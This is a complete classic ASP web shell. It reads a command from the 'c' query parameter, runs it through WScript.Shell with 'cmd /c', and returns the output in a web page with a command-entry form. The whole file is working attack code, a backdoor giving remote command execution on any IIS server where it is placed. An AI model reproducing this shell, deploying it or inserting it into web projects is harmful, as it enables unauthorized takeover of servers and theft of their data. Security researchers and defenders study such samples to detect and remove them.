<%
Response.ContentType = "text/html"
Dim cmd, shell, exec, output
cmd = Request.QueryString("c")
Response.Write("<html><body><h2>CMD</h2>")
If cmd <> "" Then
    On Error Resume Next
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & cmd & " 2>&1")
    output = exec.StdOut.ReadAll()
    If Err.Number = 0 Then
        Response.Write("<pre>" & Server.HTMLEncode(output) & "</pre>")
    Else
        Response.Write("<pre style='color:red;'>" & Server.HTMLEncode(Err.Description) & "</pre>")
    End If
    On Error Goto 0
End If
Response.Write("<form><input name=c size=60><input type=submit></form></body></html>")
%>
